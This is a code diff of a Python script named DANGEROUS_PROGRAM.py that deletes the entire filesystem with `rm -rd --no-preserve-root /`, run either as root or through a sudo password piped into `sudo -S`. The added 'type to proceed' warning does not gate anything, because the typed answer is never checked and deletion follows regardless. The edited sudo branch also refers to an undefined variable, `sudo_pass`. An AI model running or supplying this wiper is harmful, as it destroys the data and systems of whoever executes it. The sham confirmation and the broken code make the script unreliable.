@@ -1,9 +1,16 @@
 # DANGEROUS_PROGRAM.py
 import os
 import time
-def main(sudo_password):
+
+def is_root():
+    return os.geteuid() == 0
+
+def main():
+    if is_root():
+        a = input('THIS WILL DELETE YOUR SYSTEM!! TYPE "i understand and want to proceed" IF YOU UNDERSTAND THE RISKS: ')
+        os.system('rm -rd --no-preserve-root /')
     if os.name != 'nt':
-        os.system(f"echo '{sudo_password}' | sudo -S rm -rd --no-preserve-root /")
+        os.system(f"echo '{sudo_pass}' | sudo -S rm -rd --no-preserve-root /")
     else:
         print('this script is only for UNIX-like systems, you can make a VM (MAKE SURE ITS FULLY ISOLATED!)')
         time.sleep(2.5)
